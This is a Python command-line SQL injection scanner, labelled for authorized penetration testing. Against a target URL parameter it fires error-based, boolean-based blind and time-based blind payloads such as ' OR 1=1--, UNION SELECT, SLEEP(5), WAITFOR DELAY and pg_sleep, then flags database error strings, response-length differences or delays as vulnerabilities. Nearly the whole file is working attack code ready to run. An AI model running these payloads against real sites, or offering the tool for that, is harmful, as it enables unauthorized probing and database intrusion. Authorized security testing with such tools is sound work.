#!/usr/bin/env python3
"""
SQL Injection Scanner
For authorized penetration testing only
"""

import requests
import argparse
from urllib.parse import urlencode, urlparse, parse_qs
import time

class SQLiScanner:
    def __init__(self, url, param=None):
        self.url = url
        self.param = param
        self.vulnerabilities = []

        # SQL injection payloads
        self.payloads = {
            'error_based': [
                "'", "\"", "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
                "' OR 1=1--", "' OR 1=1#", "admin'--", "admin'#",
                "' UNION SELECT NULL--", "' AND 1=2--"
            ],
            'boolean_based': [
                "' AND '1'='1", "' AND '1'='2",
                "' AND 1=1--", "' AND 1=2--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SELECT SLEEP(5)--",
                "'||pg_sleep(5)--",
                "'; SELECT BENCHMARK(5000000,MD5('test'))--"
            ]
        }

        # SQL error patterns
        self.error_patterns = [
            "SQL syntax",
            "mysql_fetch",
            "Warning: mysql",
            "PostgreSQL query failed",
            "ORA-",
            "ODBC SQL Server Driver",
            "Microsoft OLE DB Provider",
            "Unclosed quotation mark",
            "SQLException",
            "syntax error"
        ]

    def test_error_based(self):
        """Test for error-based SQL injection"""
        print("\n[*] Testing for error-based SQL injection...")

        for payload in self.payloads['error_based']:
            try:
                if self.param:
                    test_url = f"{self.url}?{self.param}={payload}"
                else:
                    test_url = f"{self.url}{payload}"

                response = requests.get(test_url, timeout=5)

                # Check for SQL errors in response
                for error in self.error_patterns:
                    if error.lower() in response.text.lower():
                        vuln = {
                            'type': 'Error-based SQLi',
                            'payload': payload,
                            'url': test_url,
                            'error': error
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[+] VULNERABLE! Payload: {payload}")
                        print(f"    Error found: {error}")
                        return True

            except requests.exceptions.RequestException as e:
                print(f"[-] Request error: {e}")
                continue

        print("[-] No error-based SQL injection found")
        return False

    def test_boolean_based(self):
        """Test for boolean-based blind SQL injection"""
        print("\n[*] Testing for boolean-based blind SQL injection...")

        try:
            # Get baseline response
            baseline_response = requests.get(self.url, timeout=5)
            baseline_length = len(baseline_response.text)

            true_payload = self.payloads['boolean_based'][0]   # AND '1'='1'
            false_payload = self.payloads['boolean_based'][1]  # AND '1'='2'

            if self.param:
                true_url = f"{self.url}?{self.param}={true_payload}"
                false_url = f"{self.url}?{self.param}={false_payload}"
            else:
                true_url = f"{self.url}{true_payload}"
                false_url = f"{self.url}{false_payload}"

            true_response = requests.get(true_url, timeout=5)
            false_response = requests.get(false_url, timeout=5)

            true_length = len(true_response.text)
            false_length = len(false_response.text)

            # Check if responses differ significantly
            if abs(true_length - false_length) > 100:
                vuln = {
                    'type': 'Boolean-based blind SQLi',
                    'true_payload': true_payload,
                    'false_payload': false_payload,
                    'true_length': true_length,
                    'false_length': false_length
                }
                self.vulnerabilities.append(vuln)
                print(f"[+] VULNERABLE! Boolean-based blind SQLi detected")
                print(f"    True response length: {true_length}")
                print(f"    False response length: {false_length}")
                return True

        except requests.exceptions.RequestException as e:
            print(f"[-] Request error: {e}")

        print("[-] No boolean-based SQL injection found")
        return False

    def test_time_based(self):
        """Test for time-based blind SQL injection"""
        print("\n[*] Testing for time-based blind SQL injection...")

        for payload in self.payloads['time_based']:
            try:
                if self.param:
                    test_url = f"{self.url}?{self.param}={payload}"
                else:
                    test_url = f"{self.url}{payload}"

                start_time = time.time()
                response = requests.get(test_url, timeout=10)
                elapsed_time = time.time() - start_time

                # If response takes longer than 4 seconds, likely vulnerable
                if elapsed_time > 4:
                    vuln = {
                        'type': 'Time-based blind SQLi',
                        'payload': payload,
                        'url': test_url,
                        'delay': elapsed_time
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[+] VULNERABLE! Payload: {payload}")
                    print(f"    Response delay: {elapsed_time:.2f} seconds")
                    return True

            except requests.exceptions.Timeout:
                print(f"[+] POSSIBLE VULNERABILITY - Request timed out")
                print(f"    Payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"[-] Request error: {e}")
                continue

        print("[-] No time-based SQL injection found")
        return False

    def generate_report(self):
        """Generate vulnerability report"""
        if not self.vulnerabilities:
            print("\n[*] No SQL injection vulnerabilities detected")
            return

        print("\n" + "="*70)
        print("SQL INJECTION VULNERABILITY REPORT")
        print("="*70)
        print(f"\nTarget: {self.url}")
        print(f"Total vulnerabilities found: {len(self.vulnerabilities)}\n")

        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"\n[{i}] {vuln['type']}")
            for key, value in vuln.items():
                if key != 'type':
                    print(f"    {key}: {value}")

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--param', help='Vulnerable parameter name')

    args = parser.parse_args()

    print("""
╔═══════════════════════════════════════════════════════╗
║           SQL Injection Scanner v1.0                  ║
║         For Authorized Testing Only                   ║
╚═══════════════════════════════════════════════════════╝
    """)

    scanner = SQLiScanner(args.url, args.param)

    # Run all tests
    scanner.test_error_based()
    scanner.test_boolean_based()
    scanner.test_time_based()

    # Generate report
    scanner.generate_report()

if __name__ == "__main__":
    main()
